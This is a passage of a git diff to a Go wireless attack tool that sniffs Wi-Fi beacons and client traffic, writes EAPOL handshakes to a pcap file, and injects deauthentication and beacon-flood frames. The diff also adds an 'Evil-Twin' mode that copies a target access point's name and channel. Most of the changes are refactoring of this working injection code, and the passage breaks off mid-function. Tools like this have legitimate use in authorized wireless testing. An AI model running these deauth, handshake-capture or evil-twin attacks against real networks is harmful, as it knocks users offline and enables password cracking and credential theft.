+							if exist2 && Channel > 0 && slices.Contains(chans, Channel) {
+								if filter && singleChannel && Channel != globalChannel {
+									return
+								}
+								var oldBeacon, oldData int = 0, 0
+								var MANUFTR string
+								exist, ESSID := bettercap.Dot11ParseIDSSID(packet)
+								if !exist || !libs.IsValidESSID(ESSID) {
+									ESSID = "<?>"
+								}
+								mutex.Lock()
+								if _, exist3 := analysisData.DeviceData[SRC]; exist3 {
+									oldBeacon = analysisData.DeviceData[SRC].Beacons
+									oldData = analysisData.DeviceData[SRC].Data
+									if (!libs.IsValidESSID(ESSID) || ESSID == "<?>") && analysisData.DeviceData[SRC].Essid != ESSID {
+										ESSID = analysisData.DeviceData[SRC].Essid
+									}
+									if !exist1 {
+										ENC = analysisData.DeviceData[SRC].Enc
+									}
+									MANUFTR = analysisData.DeviceData[SRC].Manufacturer
+								} else {
+									MANUFTR = libs.GetManufacturer(macdb, SRC)
+								}
+								if _, exist4 := inactiveDevice[SRC]; exist4 {
+									analysisData.DeviceData[SRC] = libs.Device{Essid: inactiveDevice[SRC].Essid, Power: inactiveDevice[SRC].Power, Beacons: inactiveDevice[SRC].Beacons + 1, Data: inactiveDevice[SRC].Data, Ch: inactiveDevice[SRC].Ch, Enc: inactiveDevice[SRC].Enc, Manufacturer: inactiveDevice[SRC].Manufacturer, LastUpdate: time.Now()}
+									delete(inactiveDevice, SRC)
+								} else {
+									analysisData.DeviceData[SRC] = libs.Device{Essid: ESSID, Power: int(PWR), Beacons: oldBeacon + 1, Data: oldData, Ch: Channel, Enc: ENC, Manufacturer: MANUFTR, LastUpdate: time.Now()}
+								}
+								writeToPcap(packet)
+								mutex.Unlock()
+							}
+						}
+					} else if BSSID_CLIENT, MAC, err := libs.GetAPSTAData(packet); bettercap.Dot11IsDataFor(packet.Layer(layers.LayerTypeDot11).(*layers.Dot11), libs.ParseMac(MAC)) && !err {
+						if filter {
+							if strings.EqualFold(BSSID_CLIENT, MAC) || strings.EqualFold(MAC, "ff:ff:ff:ff:ff:ff") || (macFilter != "" && !strings.EqualFold(macFilter, BSSID_CLIENT)) {
+								return
+							}
+						}
+						mutex.Lock()
+						if _, exist1 := analysisData.DeviceData[BSSID_CLIENT]; exist1 {
+							analysisData.DeviceData[BSSID_CLIENT] = libs.Device{Essid: analysisData.DeviceData[BSSID_CLIENT].Essid, Power: analysisData.DeviceData[BSSID_CLIENT].Power, Beacons: analysisData.DeviceData[BSSID_CLIENT].Beacons, Data: analysisData.DeviceData[BSSID_CLIENT].Data + 1, Manufacturer: analysisData.DeviceData[BSSID_CLIENT].Manufacturer, Ch: analysisData.DeviceData[BSSID_CLIENT].Ch, Enc: analysisData.DeviceData[BSSID_CLIENT].Enc, LastUpdate: time.Now()}
+							if _, exist2 := inactiveClient[MAC]; exist2 {
+								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: inactiveClient[MAC].Bssid, Essid: inactiveClient[MAC].Essid, Manufacturer: inactiveClient[MAC].Manufacturer, Data: inactiveClient[MAC].Data + 1, Power: int(PWR), LastUpdate: time.Now()}
+								delete(inactiveClient, MAC)
+							} else if _, exist3 := analysisData.ClientData[MAC]; exist3 {
+								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: analysisData.ClientData[MAC].Bssid, Essid: analysisData.ClientData[MAC].Essid, Data: analysisData.ClientData[MAC].Data + 1, Manufacturer: analysisData.ClientData[MAC].Manufacturer, Power: int(PWR), LastUpdate: time.Now()}
+							} else {
+								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: BSSID_CLIENT, Essid: analysisData.DeviceData[BSSID_CLIENT].Essid, Data: 1, Power: int(PWR), Manufacturer: libs.GetManufacturer(macdb, MAC), LastUpdate: time.Now()}
+							}
+						}
+						writeToPcap(packet)
+						mutex.Unlock()
+					} else {
+						if packet.Layer(layers.LayerTypeLLC) == nil {
+							mutex.Lock()
+							writeToPcap(packet)
+							mutex.Unlock()
+						}
+					}
+				}
+			}
+		}(pkt)
+	}
+}
+
+func resetPreActive() {
+	mutex.Lock()
+	for mac := range analysisData.ClientData {
+		analysisData.ClientData[mac] = libs.DeviceClient{Power: analysisData.ClientData[mac].Power, Bssid: analysisData.ClientData[mac].Bssid, Essid: analysisData.ClientData[mac].Essid, Data: analysisData.ClientData[mac].Data, Manufacturer: analysisData.ClientData[mac].Manufacturer, LastUpdate: time.Now()}
+	}
+	for bssid := range analysisData.DeviceData {
+		analysisData.DeviceData[bssid] = libs.Device{Essid: analysisData.DeviceData[bssid].Essid, Power: analysisData.DeviceData[bssid].Power, Beacons: analysisData.DeviceData[bssid].Beacons, Data: analysisData.DeviceData[bssid].Data, Ch: analysisData.DeviceData[bssid].Ch, Enc: analysisData.DeviceData[bssid].Enc, Manufacturer: analysisData.DeviceData[bssid].Manufacturer, LastUpdate: time.Now()}
+	}
+	mutex.Unlock()
+}
+
+func moveActiveToInactive() {
+	for {
+		time.Sleep(100 * time.Millisecond)
+		if paused || panicExit {
+			return
+		}
+		if injblock {
+			for {
+				time.Sleep(100 * time.Millisecond)
+				if !injblock {
+					resetPreActive()
+					break
+				}
+			}
+		}
+		mutex.Lock()
+		for mac, devices := range analysisData.ClientData {
+			if time.Since(devices.LastUpdate).Seconds() > 30 {
+				delete(analysisData.ClientData, mac)
+				inactiveClient[mac] = devices
+			}
+		}
+		for bssid, devices := range analysisData.DeviceData {
+			if time.Since(devices.LastUpdate).Seconds() > 30 {
+				delete(analysisData.DeviceData, bssid)
+				inactiveDevice[bssid] = devices
+			}
+		}
+		mutex.Unlock()
 	}
 }
 
@@ -543,16 +693,16 @@ func getChFromSaved(mac string) int {
 	if data, exist := analysisData.DeviceData[mac]; exist {
 		return data.Ch
 	} else if data, exist := inactiveDevice[mac]; exist {
-		return data.Ch 
+		return data.Ch
 	}
 	return -1
 }
 
 func sortForChannel(macs []string) []string {
-	for i := 0; i < len(macs) - 1; i++ {
-		for j := 0; j < len(macs) - i - 1; j++ {
-			if getChFromSaved(macs[j]) > getChFromSaved(macs[j + 1]) {
-				macs[j], macs[j + 1] = macs[j + 1], macs[j]
+	for i := 0; i < len(macs)-1; i++ {
+		for j := 0; j < len(macs)-i-1; j++ {
+			if getChFromSaved(macs[j]) > getChFromSaved(macs[j+1]) {
+				macs[j], macs[j+1] = macs[j+1], macs[j]
 			}
 		}
 	}
@@ -585,26 +735,24 @@ func inject(nameiface string) {
 		} else {
 			mMac = tableinj.SRC
 		}
-		sMac = tableinj.DST[0]
-		sdtype = "src"
+		sMac, sdtype = tableinj.DST[0], "src"
 	} else {
 		if injtype == "De-Auth" {
 			mMac = sortForChannel(tableinj.DST)
 		} else {
 			mMac = tableinj.DST
 		}
-		sMac = tableinj.SRC[0]
-		sdtype = "dst"
+		sMac, sdtype = tableinj.SRC[0], "dst"
 	}
 	injblock = true
 	mutex.Unlock()
-	defer func(){injblock = false}()
+	defer func() { injblock = false }()
 	if len(mMac) > 2 {
-		go func(){
+		go func() {
 			for {
 				for _, m := range mMac {
 					mutex.Lock()
-					seqdatalist[len(seqdatalist) - 1].Target = injdst
+					seqdatalist[len(seqdatalist)-1].Target = injdst
 					mutex.Unlock()
 					time.Sleep(500 * time.Millisecond)
 					if sdtype == "src" {
@@ -613,13 +761,17 @@ func inject(nameiface string) {
 						injdst = m
 					}
 				}
-				if !injection {return}
-				for paused {time.Sleep(100 * time.Millisecond)}
+				if !injection {
+					return
+				}
+				for paused {
+					time.Sleep(100 * time.Millisecond)
+				}
 			}
 		}()
 	}
 	for {
-		if injtype == "Beacon" {		
+		if injtype == "Beacon" {
 			var waitTime time.Duration = time.Duration(102.4 * float64(time.Millisecond))
 			for seq := 0; seq < 64; seq++ {
 				seqdatalist = append(seqdatalist, libs.InjectData{Of1: 0, Of2: len(mMac), Target: sMac, Failed: false, Seq: "no-value"})
@@ -632,23 +784,26 @@ func inject(nameiface string) {
 					prevch = globalChannel
 					globalChannel = injch
 					if ptempl := injpacket.Beacon(injessid, injsrc, injch, seq); injpacket.InjectPacket(handle, nameiface, injch, prevch, ptempl) {
-						seqdatalist[len(seqdatalist) - 1].Of1++
+						seqdatalist[len(seqdatalist)-1].Of1++
 					} else {
-						seqdatalist[len(seqdatalist) - 1].Failed = true
+						seqdatalist[len(seqdatalist)-1].Failed = true
 					}
-					time.Sleep(waitTime) 
-					if !injection {return}
-					for paused {time.Sleep(100 * time.Millisecond)}
-				}	
+					time.Sleep(waitTime)
+					if !injection {
+						return
+					}
+					for paused {
+						time.Sleep(1 * time.Second)
+					}
+				}
 			}
-		} else if injtype == "De-Auth" {		
+		} else if injtype == "De-Auth" {
 			seqdatalist = append(seqdatalist, libs.InjectData{Of1: 0, Of2: len(mMac), Target: injdst, Failed: false, Seq: "0"})
 			if len(seqdatalist) == 1 {
 				mutex.Lock()
 				tableScene = 8
 				mutex.Unlock()
 			}
-			var waitTime time.Duration = time.Duration(2 / len(mMac)) * time.Millisecond
 			for _, m := range mMac {
 				if sdtype == "src" {
 					injsrc = m
@@ -663,40 +818,31 @@ func inject(nameiface string) {
 				prevch = globalChannel
 				globalChannel = injch
 				if len(mMac) < 3 {
-					seqdatalist[len(seqdatalist) - 1].Target = injdst
+					seqdatalist[len(seqdatalist)-1].Target = injdst
 				}
-				for seq := 0; seq < 128; seq++ {
-					seqdatalist[len(seqdatalist) - 1].Seq = libs.GetCapsFormat(strconv.Itoa(seq + 1), 3, "0") 
+				var seqSize int
+				if libs.Fmac(injdst) == "FF:FF:FF:FF:FF:FF" {
+					seqSize = 128
+				} else {
+					seqSize = 64
+				}
+				for seq := 0; seq < seqSize; seq++ {
+					seqdatalist[len(seqdatalist)-1].Seq = libs.GetCapsFormat(strconv.Itoa(seq+1), 3, "0")
 					if ptempl := injpacket.Deauth(injsrc, injdst, seq); !injpacket.InjectPacket(handle, nameiface, injch, prevch, ptempl) {
-						seqdatalist[len(seqdatalist) - 1].Failed = true
+						seqdatalist[len(seqdatalist)-1].Failed = true
 					}
-					time.Sleep(waitTime)
-					if !injection {return}
-					for paused {time.Sleep(100 * time.Millisecond)}
+					time.Sleep(2 * time.Millisecond)
+					if !injection {
+						return
+					}
+					for paused {
+						time.Sleep(1 * time.Second)
+					}
 				}
-				seqdatalist[len(seqdatalist) - 1].Of1++
+				seqdatalist[len(seqdatalist)-1].Of1++
 			}
 			time.Sleep(180 * time.Millisecond)
 		}
-	}
-}
-
-func regE(nameiface string) {
-	var regKey *hotkey.Hotkey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyE)
-	regKey.Register()
-	defer regKey.Unregister()
-	for {
-		<- regKey.Keydown()
-		<- regKey.Keyup()
-		mutex.Lock()
-		if paused {
-			libs.SetMonitorMode(nameiface)
-			paused = false
-		} else {
-			libs.SetManagedMode(nameiface)
-			paused = true
-		}
-		mutex.Unlock()
 	}
 }
 
@@ -709,56 +855,34 @@ func regD(nameiface string) {
 	for {
 		time.Sleep(100 * time.Millisecond)
 		select {
-			case <- regDKey.Keydown():
-				<- regDKey.Keyup()
-				mutex.Lock()
-				if injection {
-					injection = false
-					tableScene = 7
-				} else {
-					seqdatalist = []libs.InjectData{}
-					injection = true
-					go inject(nameiface)
-				}
+		case <-regDKey.Keydown():
+			<-regDKey.Keyup()
+			mutex.Lock()
+			if injection {
+				injection = false
+				tableScene = 7
+			} else {
+				seqdatalist = []libs.InjectData{}
+				injection = true
+				go inject(nameiface)
+			}
+			mutex.Unlock()
+		default:
+			mutex.Lock()
+			if !openTable {
+				injection = false
 				mutex.Unlock()
-			default:
-				mutex.Lock()
-				if !openTable {
-					injection = false
-					mutex.Unlock()
-					return
-				}
-				mutex.Unlock()
+				return
+			}
+			mutex.Unlock()
 		}
-	}
-}
-
-func regT(nameiface string, ChannelList []int) {
-	var regKey *hotkey.Hotkey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyT)
-	regKey.Register()
-	defer regKey.Unregister()
-	for {
-		<- regKey.Keydown()
-		<- regKey.Keyup()
-		mutex.Lock()
-		keyboard.Close()
-		if !openTable {
-			tableinj = libs.INJTable{}
-			srcTable, dstTable, esdTable, tableScene, errTable = "", "", "", 0, 0
-			openTable = true
-			go regXINJ(nameiface, ChannelList)
-		} else {
-			openTable = false
-			injection = false
-		}
-		mutex.Unlock()
 	}
 }
 
 func regXINJ(nameiface string, ChannelList []int) {
 	event, _ := keyboard.GetKeys(10)
 	for {
-		eventdata := <- event
+		eventdata := <-event
 		mutex.Lock()
 		if eventdata.Key == keyboard.KeyEsc {
 			openTable = false
@@ -766,18 +890,38 @@ func regXINJ(nameiface string, ChannelList []int) {
 			mutex.Unlock()
 			return
 		}
-		if eventdata.Rune == '1' {
+		switch eventdata.Rune {
+		case '1':
 			tableinj = libs.INJTable{INJ: "De-Auth"}
 			tableScene = 1
 			keyboard.Close()
 			go reg1234(nameiface, ChannelList)
 			mutex.Unlock()
 			return
-		} else if eventdata.Rune == '2' {
+		case '2':
 			tableinj = libs.INJTable{INJ: "Beacon", DST: []string{"ffffffffffff"}}
 			tableScene = 1
 			keyboard.Close()
 			go reg1234(nameiface, ChannelList)
+			mutex.Unlock()
+			return
+		case '3':
+			if chfromsaved := getChFromSaved(macFilter); macFilter != "" && chfromsaved != -1 {
+				tableinj = libs.INJTable{INJ: "Evil-Twin", DST: []string{"ffffffffffff"}, SRC: []string{strings.ToLower(strings.ReplaceAll(macFilter, ":", ""))}}
+				tableinj.ESSID = analysisData.DeviceData[libs.Fmac(macFilter)].Essid
+				tableinj.CHANNEL = chfromsaved
+				tableScene, openTable = 0, false
+				keyboard.Close()
+				panicExit = true
+				mutex.Unlock()
+				time.Sleep(150 * time.Millisecond)
+				runEvilTwin(nameiface)
+				return
+			}
+			tableinj = libs.INJTable{INJ: "Evil-Twin", DST: []string{"ffffffffffff"}}
+			tableScene = 2
+			keyboard.Close()
+			go regWM("src", nameiface, ChannelList)
 			mutex.Unlock()
 			return
 		}
@@ -788,7 +932,7 @@ func regXINJ(nameiface string, ChannelList []int) {
 func regESSID(nameiface string) {
 	event, _ := keyboard.GetKeys(10)
 	for {
-		eventdata := <- event
+		eventdata := <-event
 		mutex.Lock()
 		if eventdata.Key == keyboard.KeyEsc {
 			openTable = false
@@ -797,33 +941,30 @@ func regESSID(nameiface string) {
 			return
 		}
 		if eventdata.Key == keyboard.KeyBackspace && len(esdTable) > 0 {
-			esdTable = esdTable[:len(esdTable) - 1]
+			esdTable = esdTable[:len(esdTable)-1]
 			mutex.Unlock()
 			continue
 		}
 		if eventdata.Key == keyboard.KeyEnter {
 			if libs.IsValidESSID(esdTable) {
 				tableinj.ESSID = esdTable
-				tableScene = 7
-				esdTable = ""
+				tableScene, esdTable = 7, ""
 				keyboard.Close()
 				go regD(nameiface)
 			} else {
 				var oldScene int = tableScene
-				errTable = 1
-				tableScene = 9
+				errTable, tableScene = 1, 9
 				mutex.Unlock()
 				time.Sleep(3 * time.Second)
 				mutex.Lock()
-				tableScene = oldScene
-				esdTable = ""
+				tableScene, esdTable = oldScene, ""
 				keyboard.Close()
 				go regESSID(nameiface)
 			}
 			mutex.Unlock()
 			return
 		}
-		if len(esdTable) < 32 { 
+		if len(esdTable) < 32 {
 			if eventdata.Rune == 0 {
 				esdTable += " "
 			} else {
@@ -837,7 +978,7 @@ func regESSID(nameiface string) {
 func regCh(nameiface string, ChannelList []int) {
 	event, _ := keyboard.GetKeys(10)
 	for {
-		eventdata := <- event
+		eventdata := <-event
 		mutex.Lock()
 		if eventdata.Key == keyboard.KeyEsc {
 			openTable = false
@@ -846,20 +987,18 @@ func regCh(nameiface string, ChannelList []int) {
 			return
 		}
 		if eventdata.Key == keyboard.KeyBackspace && len(chTable) > 0 {
-			chTable = chTable[:len(chTable) - 1]
+			chTable = chTable[:len(chTable)-1]
 		}
 		if eventdata.Key == keyboard.KeyEnter {
 			ch, _ := strconv.Atoi(chTable)
 			if slices.Contains(ChannelList, ch) {
 				tableinj.CHANNEL = ch
-				tableScene = 10
-				chTable = ""
+				tableScene, chTable = 10, ""
 				keyboard.Close()
 				go regESSID(nameiface)
 			} else {
 				var oldScene int = tableScene
-				tableScene = 9
-				errTable = 2
+				tableScene, errTable = 9, 2
 				mutex.Unlock()
 				time.Sleep(3 * time.Second)
 				mutex.Lock()
@@ -881,7 +1020,7 @@ func regCh(nameiface string, ChannelList []int) {
 func reg1234(nameiface string, ChannelList []int) {
 	event, _ := keyboard.GetKeys(10)
 	for {
-		eventdata := <- event
+		eventdata := <-event
 		mutex.Lock()
 		if eventdata.Key == keyboard.KeyEsc {
 			openTable = false
@@ -890,11 +1029,12 @@ func reg1234(nameiface string, ChannelList []int) {
 			return
 		}
 		if eventdata.Rune == '1' {
-			if tableScene == 1 {
+			switch tableScene {
+			case 1:
 				tableScene = 2
 				keyboard.Close()
 				go regWM("src", nameiface, ChannelList)
-			} else if tableScene == 3 {
+			case 3:
 				tableinj.DST = libs.GetNoDuplicates(append(tableinj.DST, libs.RandMac()))
 				if len(tableinj.SRC) > 1 {
 					tableinj.DST = libs.GetNoDuplicates(tableinj.DST)
@@ -906,11 +1046,11 @@ func reg1234(nameiface string, ChannelList []int) {
 					keyboard.Close()
 					go reg1234(nameiface, ChannelList)
 				}
-			} else if tableScene == 5 {
+			case 5:
 				tableScene = 1
 				keyboard.Close()
 				go reg1234(nameiface, ChannelList)
-			} else if tableScene == 6 {
+			case 6:
 				tableScene = 3
 				keyboard.Close()
 				go reg1234(nameiface, ChannelList)
@@ -918,19 +1058,21 @@ func reg1234(nameiface string, ChannelList []int) {
 			mutex.Unlock()
 			return
 		} else if eventdata.Rune == '2' {
-			if tableScene == 1 {
-				if tableinj.INJ == "De-Auth" {
+			switch tableScene {
+			case 1:
+				switch tableinj.INJ {
+				case "De-Auth":
 					tableinj.SRC = libs.GetNoDuplicates(append(tableinj.SRC, maps.Keys(analysisData.DeviceData)...))
 					tableScene = 5
 					keyboard.Close()
 					go reg1234(nameiface, ChannelList)
-				} else if tableinj.INJ == "Beacon" {
+				case "Beacon":
 					tableinj.SRC = libs.GetNoDuplicates(append(tableinj.SRC, libs.RandMac()))
 					tableScene = 11
 					keyboard.Close()
 					go regCh(nameiface, ChannelList)
 				}
-			} else if tableScene == 3 {
+			case 3:
 				tableinj.DST = libs.GetNoDuplicates(append(tableinj.DST, "ffffffffffff"))
 				if len(tableinj.SRC) > 1 {
 					tableScene = 7
@@ -941,11 +1083,11 @@ func reg1234(nameiface string, ChannelList []int) {
 					keyboard.Close()
 					go reg1234(nameiface, ChannelList)
 				}
-			} else if tableScene == 5 {
+			case 5:
 				tableScene = 3
 				keyboard.Close()
 				go reg1234(nameiface, ChannelList)
-			} else if tableScene == 6 {
+			case 6:
 				tableScene = 7
 				keyboard.Close()
 				go regD(nameiface)
@@ -953,32 +1095,34 @@ func reg1234(nameiface string, ChannelList []int) {
 			mutex.Unlock()
 			return
 		} else if eventdata.Rune == '3' {
-			if tableScene == 3 {
+			switch tableScene {
+			case 3:
 				tableScene = 4
 				keyboard.Close()
 				go regWM("dst", nameiface, ChannelList)
+				mutex.Unlock()
+				return
 			}
-			mutex.Unlock()
-			return
 		} else if eventdata.Rune == '4' && tableinj.INJ == "De-Auth" && len(tableinj.SRC) == 1 {
 			if stations := getStationsFromBSSIDs(tableinj.SRC); len(stations) > 0 {
 				tableinj.DST = libs.GetNoDuplicates(append(tableinj.DST, stations...))
 				tableScene = 6
 				keyboard.Close()
 				go reg1234(nameiface, ChannelList)
+				mutex.Unlock()
+				return
 			} else {
 				var oldScene int = tableScene
-				tableScene = 9
-				errTable = 2
+				tableScene, errTable = 9, 2
 				mutex.Unlock()
 				time.Sleep(3 * time.Second)
 				mutex.Lock()
 				tableScene = oldScene
 				keyboard.Close()
 				go reg1234(nameiface, ChannelList)
+				mutex.Unlock()
+				return
 			}
-			mutex.Unlock()
-			return
 		}
 		mutex.Unlock()
 	}
@@ -987,7 +1131,7 @@ func reg1234(nameiface string, ChannelList []int) {
 func regWM(way string, nameiface string, ChannelList []int) {
 	event, _ := keyboard.GetKeys(10)
 	for openTable {
-		eventdata := <- event
+		eventdata := <-event
 		mutex.Lock()
 		if eventdata.Key == keyboard.KeyEsc {
 			openTable = false
@@ -996,41 +1140,59 @@ func regWM(way string, nameiface string, ChannelList []int) {
 			return
 		}
 		if eventdata.Key == keyboard.KeyBackspace {
-			if way == "src" && len(srcTable) > 0 { 
-				srcTable = srcTable[:len(srcTable) - 1]
+			if way == "src" && len(srcTable) > 0 {
+				srcTable = srcTable[:len(srcTable)-1]
 			} else if way == "dst" && len(dstTable) > 0 {
-				dstTable = dstTable[:len(dstTable) - 1]
+				dstTable = dstTable[:len(dstTable)-1]
 			}
 		}
 		if strings.Contains("abcdefABCDEF1234567890", fmt.Sprintf("%c", eventdata.Rune)) {
 			if way == "src" {
 				srcTable += strings.ToUpper(fmt.Sprintf("%c", eventdata.Rune))
 				if len(srcTable) >= 12 {
-					if tableinj.INJ == "De-Auth" {
+					switch tableinj.INJ {
+					case "De-Auth":
 						if getChFromSaved(srcTable) != -1 {
 							tableinj.SRC = libs.GetNoDuplicates(append(tableinj.SRC, srcTable))
-							srcTable = ""
-							tableScene = 5
+							srcTable, tableScene = "", 5
 							keyboard.Close()
 							go reg1234(nameiface, ChannelList)
 						} else {
 							var oldScene int = tableScene
-							tableScene = 9
-							errTable = 1
+							tableScene, errTable = 9, 1
 							mutex.Unlock()
 							time.Sleep(3 * time.Second)
 							mutex.Lock()
-							tableScene = oldScene
-							srcTable = ""
+							tableScene, srcTable = oldScene, ""
 							keyboard.Close()
 							go regWM("src", nameiface, ChannelList)
 						}
-					} else if tableinj.INJ == "Beacon" {
+					case "Beacon":
 						tableinj.SRC = libs.GetNoDuplicates(append(tableinj.SRC, srcTable))
-						srcTable = ""
-						tableScene = 11
+						srcTable, tableScene = "", 11
 						keyboard.Close()
 						go regCh(nameiface, ChannelList)
+					case "Evil-Twin":
+						if tableinj.CHANNEL = getChFromSaved(srcTable); tableinj.CHANNEL != -1 {
+							tableinj.SRC = []string{srcTable}
+							tableinj.ESSID = analysisData.DeviceData[libs.Fmac(srcTable)].Essid
+							tableScene, openTable, srcTable = 0, false, ""
+							keyboard.Close()
+							panicExit = true
+							mutex.Unlock()
+							time.Sleep(150 * time.Millisecond)
+							runEvilTwin(nameiface)
+							return
+						} else {
+							var oldScene int = tableScene
+							tableScene, errTable = 9, 1
+							mutex.Unlock()
+							time.Sleep(3 * time.Second)
+							mutex.Lock()
+							tableScene, srcTable = oldScene, ""
+							keyboard.Close()
+							go regWM("src", nameiface, ChannelList)
+						}
 					}
 					mutex.Unlock()
 					return
@@ -1058,187 +1220,71 @@ func regWM(way string, nameiface string, ChannelList []int) {
 	}
 }
 
-func resetPreActive() {
-	mutex.Lock()
-	for mac := range analysisData.ClientData {
-		analysisData.ClientData[mac] = libs.DeviceClient{Power: analysisData.ClientData[mac].Power, Bssid: analysisData.ClientData[mac].Bssid, Essid: analysisData.ClientData[mac].Essid, Data: analysisData.ClientData[mac].Data, Manufacturer: analysisData.ClientData[mac].Manufacturer, LastUpdate: time.Now()}
-	}
-	for bssid := range analysisData.DeviceData {
-		analysisData.DeviceData[bssid] = libs.Device{Essid: analysisData.DeviceData[bssid].Essid, Power: analysisData.DeviceData[bssid].Power, Beacons: analysisData.DeviceData[bssid].Beacons, Data: analysisData.DeviceData[bssid].Data, Ch: analysisData.DeviceData[bssid].Ch, Enc: analysisData.DeviceData[bssid].Enc, Manufacturer: analysisData.DeviceData[bssid].Manufacturer, LastUpdate: time.Now()}
-	}
-	mutex.Unlock()
-}
-
-func moveActiveToInactive() {
-	for {
-		time.Sleep(100 * time.Millisecond)
-		if paused || panicExit {return}
-		if injblock {for {time.Sleep(100 * time.Millisecond); if !injblock {resetPreActive(); break}}}
-		mutex.Lock()
-		for mac, devices := range analysisData.ClientData {
-			if time.Since(devices.LastUpdate) > time.Second * 30 {
-				delete(analysisData.ClientData, mac)
-				inactiveClient[mac] = devices
-			}
+func engine(channelList []int, prefix string) {
+	channelChanger(channelList)
+	go func() {
+		handle = libs.GetMonitorSniffer(nameiface, color)
+		go handlePacket(handle, channelList, prefix, true, false)
+		if !disableInactiver {
+			go moveActiveToInactive()
 		}
-		for bssid, devices := range analysisData.DeviceData {
-			if time.Since(devices.LastUpdate) > time.Second * 30 {
-				delete(analysisData.DeviceData, bssid)
-				inactiveDevice[bssid] = devices
-			}
-		}
-		mutex.Unlock()
-	}
-}
-
-func recEapol(packet gopacket.Packet) {
-	if packet.Layer(layers.LayerTypeDot11) != nil {
-		if exist, _, apmac, stamac := bettercap.Dot11ParseEAPOL(packet, packet.Layer(layers.LayerTypeDot11).(*layers.Dot11)); exist {
-			if libs.IsValidMAC(apmac.String()) && libs.IsValidMAC(stamac.String()) && !slices.Contains(capturedEapol, apmac.String() + "<-" + stamac.String()){
-				capturedEapol = append(capturedEapol, apmac.String() + "<-" + stamac.String())
-			}
-		}
-	}
-	if packet.Layer(layers.LayerTypeEAPOLKey) != nil {
-		mutex.Lock()
-		writeToPcap(packet)
-		mutex.Unlock()
-	}
-}
-
-func writeToPcap(packet gopacket.Packet) {
-	if enabledWriter && !panicExit {
-		writing = true
-		pcapWriter.WritePacket(gopacket.CaptureInfo{
-		Timestamp:      time.Now(),
-		Length:         len(packet.Data()),
-		CaptureLength: len(packet.Data()), 
-		}, packet.Data())
-		writing = false
-	}
-}
-
-func handlePacket(handle *pcap.Handle, chans []int, prefix string, filter bool, onlyBeacon bool, offload bool) {
-	var packets *gopacket.PacketSource = gopacket.NewPacketSource(handle, handle.LinkType())
-	defer handle.Close()
-
-	var firstMP, lastMP time.Time
-	if offload {defer func(){elapsedTime = time.Now().Add(-lastMP.Sub(firstMP))}()}
-	
-	for pkt := range packets.Packets() {
-		if paused || panicExit || stopScan {return}
-		if offload {
-			lastMP = pkt.Metadata().Timestamp
-			if firstMP.IsZero() {
-				firstMP = pkt.Metadata().Timestamp
-			}
-		}
-		go recEapol(pkt)
-		go func(packet gopacket.Packet) {
-			if packet.ErrorLayer() == nil && packet != nil && packet.Layer(layers.LayerTypeDot11) != nil {
-				if PWR, err := libs.GetDBM(packet); !err {
-					if libs.IsBeacon(packet) {
-						if SRC, err1 := libs.GetSRCBeacon(packet); err1 == nil {
-							if filter && ((macFilter != "" && !strings.EqualFold(macFilter, SRC)) || (prefix != "?" && !strings.HasPrefix(strings.ToLower(SRC), strings.ToLower(prefix)))) {return}
-							exist1, ENC := libs.GetEncString(bettercap.Dot11ParseEncryption(packet, packet.Layer(layers.LayerTypeDot11).(*layers.Dot11)))
-							exist2, Channel := bettercap.Dot11ParseDSSet(packet)
-							if exist2 && Channel > 0 && slices.Contains(chans, Channel) {
-								if filter && singleChannel && Channel != globalChannel {return}
-								var oldBeacon, oldData int = 0, 0
-								var MANUFTR string
-								exist, ESSID := bettercap.Dot11ParseIDSSID(packet)
-								if !exist || !libs.IsValidESSID(ESSID) {
-									ESSID = "<?>"
-								}
-								mutex.Lock()
-								if _, exist3 := analysisData.DeviceData[SRC]; exist3 {
-									oldBeacon = analysisData.DeviceData[SRC].Beacons
-									oldData = analysisData.DeviceData[SRC].Data
-									if (!libs.IsValid(ESSID) || ESSID == "<?>") && analysisData.DeviceData[SRC].Essid != ESSID {
-										ESSID = analysisData.DeviceData[SRC].Essid
-									}
-									if !exist1 {
-										ENC = analysisData.DeviceData[SRC].Enc
-									}
-									MANUFTR = analysisData.DeviceData[SRC].Manufacturer
-								} else {
-									MANUFTR = libs.GetManufacturer(macdb, SRC)
-								}
-								if _, exist4 := inactiveDevice[SRC]; exist4 {
-									analysisData.DeviceData[SRC] = libs.Device{Essid: inactiveDevice[SRC].Essid, Power: inactiveDevice[SRC].Power, Beacons: inactiveDevice[SRC].Beacons + 1, Data: inactiveDevice[SRC].Data, Ch: inactiveDevice[SRC].Ch, Enc: inactiveDevice[SRC].Enc, Manufacturer: inactiveDevice[SRC].Manufacturer, LastUpdate: time.Now()}
-									delete(inactiveDevice, SRC)
-								} else {
-									analysisData.DeviceData[SRC] = libs.Device{Essid: ESSID, Power: int(PWR), Beacons: oldBeacon + 1, Data: oldData, Ch: Channel, Enc: ENC, Manufacturer: MANUFTR, LastUpdate: time.Now()}
-								}
-								writeToPcap(packet)
-								mutex.Unlock()
-							}
+		for {
+			time.Sleep(time.Millisecond * 100)
+			if paused {
+				for {
+					time.Sleep(time.Millisecond * 100)
+					if !paused {
+						if !disableInactiver {
+							resetPreActive()
 						}
-					} else if BSSID_CLIENT, MAC, err := libs.GetAPSTDATA(packet); bettercap.Dot11IsDataFor(packet.Layer(layers.LayerTypeDot11).(*layers.Dot11), libs.ParseMac(MAC)) && err == nil && !onlyBeacon {
-						if filter {
-							if strings.EqualFold(BSSID_CLIENT, MAC) || strings.EqualFold(MAC, "ff:ff:ff:ff:ff:ff") || (macFilter != "" && !strings.EqualFold(macFilter, BSSID_CLIENT)) {
-								return
-							}
+						handle = libs.GetMonitorSniffer(nameiface, color)
+						go handlePacket(handle, channelList, prefix, true, false)
+						if !disableInactiver {
+							go moveActiveToInactive()
 						}
-						mutex.Lock()
-						if _, exist1 := analysisData.DeviceData[BSSID_CLIENT]; exist1 {
-							analysisData.DeviceData[BSSID_CLIENT] = libs.Device{Essid: analysisData.DeviceData[BSSID_CLIENT].Essid, Power: analysisData.DeviceData[BSSID_CLIENT].Power, Beacons: analysisData.DeviceData[BSSID_CLIENT].Beacons, Data: analysisData.DeviceData[BSSID_CLIENT].Data + 1, Manufacturer: analysisData.DeviceData[BSSID_CLIENT].Manufacturer, Ch: analysisData.DeviceData[BSSID_CLIENT].Ch, Enc: analysisData.DeviceData[BSSID_CLIENT].Enc, LastUpdate: time.Now()}
